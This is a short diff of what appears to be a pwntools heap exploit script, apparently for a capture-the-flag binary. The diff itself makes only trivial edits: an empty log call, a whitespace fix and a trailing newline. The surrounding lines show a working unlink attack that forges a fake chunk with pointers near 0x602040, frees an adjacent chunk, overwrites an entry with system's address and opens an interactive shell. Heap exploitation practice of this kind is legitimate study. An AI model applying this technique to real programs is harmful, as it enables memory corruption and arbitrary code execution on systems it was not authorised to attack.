@@ -39,10 +39,11 @@ add(3 , "d")
 add(4 , "f") # ptr[3]
 add(5 , "g")
 # unlink_fake_chunk
+log.info()
 ptr = 0x602040
 content = p64(0) + p64(0x81) + p64(ptr) + p64(ptr + 0x8)
 content = content.ljust(0x80 , "a") + p64(0x80) + p64(0x90)
-edit(3 , content )
+edit(3 , content)
 # go
 delete(4)
 # step2
@@ -61,3 +62,4 @@ edit(3 , p64(system))
 delete(1)
 
 p.interactive()
+
